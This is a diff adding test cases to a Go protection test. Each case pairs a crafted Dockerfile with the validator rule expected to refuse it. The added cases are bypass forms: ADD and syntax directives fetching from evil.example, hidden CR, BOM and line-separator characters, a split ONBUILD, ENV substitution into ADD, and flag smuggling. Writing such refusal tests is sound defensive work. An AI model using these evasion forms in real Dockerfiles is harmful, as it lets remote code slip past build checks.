@@ -58,6 +58,29 @@ var dockerfileOutsideForm = map[string]struct{ file, rule string }{
 	"FROM stage other case":          {"FROM busybox AS build\nFROM Build\n", ruleStageName},
 	"stage name twice":               {"FROM busybox AS a\nFROM alpine:3 AS a\nCOPY --from=a /a /b\n", ruleStageName},
 	"stage name starts with a digit": {"FROM busybox AS 0x\nCOPY --from=0x /a /b\n", ruleStageName},
+	// PR #308 tester: one more form per bypass class.
+	"check directive":          {"# check=skip=all\nFROM busybox\n", ruleDirective},
+	"directive after tab":      {"#\tsyntax=evil.example/fe\nFROM busybox\n", ruleDirective},
+	"CR inside a line":         {"FROM busybox\nADD a\rhttp://evil.example/x /x\n", ruleCharacter},
+	"no-break space":           {"FROM busybox\nADD http://evil.example/x /x\n", ruleCharacter},
+	"line separator":           {"FROM busybox ADD http://evil.example/x /x\n", ruleCharacter},
+	"BOM inside":               {"FROM busybox\n\xef\xbb\xbfADD a /b\n", ruleCharacter},
+	"heredoc quoted word":      {"FROM busybox\nRUN <<\"EOF\"\nx\nEOF\n", ruleHeredoc},
+	"heredoc in exec form":     {"FROM busybox\nRUN [\"sh\", \"-c\", \"cat <<EOF\"]\n", ruleHeredoc},
+	"ONBUILD split":            {"FROM busybox\nON\\\nBUILD ADD http://evil.example/x /x\n", ruleOnbuild},
+	"ENV source in ADD":        {"FROM busybox\nENV U=http://evil.example/x\nADD ${U} /x\n", ruleRemoteAdd},
+	"platform default":         {"FROM --platform=${BUILDPLATFORM:-linux/s390x} busybox\n", rulePlatform},
+	"global ARG value":         {"ARG V=1\nFROM busybox\n", ruleGlobalArg},
+	"global ARG two names":     {"ARG A B\nFROM busybox\n", ruleGlobalArg},
+	"SOURCE_DATE_EPOCH stage":  {"ARG SOURCE_DATE_EPOCH=sde\nFROM scratch AS sde\nADD https://evil.example/x /x\nFROM busybox\n", ruleGlobalArg},
+	"SOURCE_DATE_EPOCH no ARG": {"FROM scratch AS sde\nADD https://evil.example/x /x\n", ruleRemoteAdd},
+	"ADD git scheme":           {"FROM busybox\nADD git://evil.example/r /x\n", ruleRemoteAdd},
+	"ADD JSON git":             {"FROM busybox\nADD [\"https://evil.example/r.git#main\", \"/x\"]\n", ruleRemoteAdd},
+	"mount from sha256":        {"FROM busybox\nRUN --mount=from=SHA256:526F,target=/x true\n", ruleImageName},
+	"COPY from sha256":         {"FROM busybox\nCOPY --from=sha256:abcd /a /b\n", ruleImageName},
+	"stage named by a number":  {"FROM busybox AS 1\n", ruleStageName},
+	"COPY parents quoted":      {"FROM busybox\nCOPY --parents=\"true\" a /b\n", ruleFlag},
+	"COPY end of flags":        {"FROM busybox\nCOPY -- --from=evil.example/x /b\n", ruleFlag},
 }
 
 // TestDockerfileOutsideFormRefused is the protection test for the v0.2
